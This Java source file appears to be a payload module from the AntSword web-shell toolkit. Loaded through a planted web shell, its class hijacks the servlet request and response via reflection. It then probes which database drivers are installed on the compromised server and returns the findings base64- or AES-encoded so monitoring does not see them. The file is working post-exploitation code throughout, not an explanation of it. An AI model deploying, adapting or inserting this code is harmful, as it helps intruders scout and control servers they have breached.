package base;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import javax.crypto.*;
import java.security.*;
import javax.crypto.spec.*;


public class Probedb {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String cs;
    public String key = "antswordAESKey";
    public String encode = "antswordDefault"; // default base64 aes
    @Override
    public boolean equals(Object obj) {
        try {
            Class clazz = Class.forName("javax.servlet.jsp.PageContext");
            request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
            response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
        } catch (Exception e) {
            if (obj instanceof HttpServletRequest) {
                request = (HttpServletRequest) obj;
                try {
                    Field req = request.getClass().getDeclaredField("request");
                    req.setAccessible(true);
                    HttpServletRequest request2 = (HttpServletRequest) req.get(request);
                    Field resp = request2.getClass().getDeclaredField("response");
                    resp.setAccessible(true);
                    response = (HttpServletResponse) resp.get(request2);
                } catch (Exception ex) {
                    try {
                        response = (HttpServletResponse) request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                    } catch (Exception ignored) {

                    }
                }
            }
        }

        cs = "UTF-8";
        StringBuffer output = new StringBuffer("");
        String tag_s = "->|";
        String tag_e = "|<-";


        try {
            response.setContentType("text/html");
            request.setCharacterEncoding(cs);
            response.setCharacterEncoding(cs);
            output.append(ProbedbCode(request));
        } catch (Exception e) {
            output.append("ERROR:// " + e.toString());
        }
        try {
            response.getWriter().print(tag_s + encoder(encode,output.toString()) + tag_e);
        } catch (Exception ignored) {
        }
        return true;
    }

    String encoder(String encode,String text) throws Exception {
        String res = "";
    
        if("base64".equals(encode)){
            res = base64Encode(text.getBytes());
        }else if ("aes".equals(encode)){
            res = AesEncrypt(key,text);
        }else{
            res = text;
        }
        return res;
    }
    
    String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
                value = value.replace("\n", "").replace("\r", "");
            } catch (Exception e2) {
                
            }
        }
        return value;
    }
    String AesEncrypt(String key, String cleartext) throws Exception {
        cleartext = base64Encode(cleartext.getBytes());
        IvParameterSpec zeroIv = new IvParameterSpec(key.getBytes());
        SecretKeySpec keys = new SecretKeySpec(key.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance(new String("AES/CFB/NoPadding"));
        cipher.init(Cipher.ENCRYPT_MODE, keys, zeroIv);  
        byte[] encryptedData = cipher.doFinal(cleartext.getBytes("UTF-8"));
        String sb = base64Encode(encryptedData);
        return sb;
    }


    String ProbedbCode(HttpServletRequest r) {
        String[] drivers = new String[]{
                "com.mysql.jdbc.Driver",
                "com.mysql.cj.jdbc.Driver",
                "oracle.jdbc.driver.OracleDriver",
                "org.postgresql.Driver",
                "weblogic.jdbc.mssqlserver4.Driver",
                "com.microsoft.sqlserver.jdbc.SQLServerDriver",
                "com.inet.pool.PoolDriver",
        };
        String ret = "";
        for (int i = 0; i < drivers.length; i++) {
            try {
                Class.forName(drivers[i]);
                ret += drivers[i] + "\t1\n";
            } catch (Exception e) {
                ret += drivers[i] + "\t0\n";
            }
        }
        return ret;
    }
}
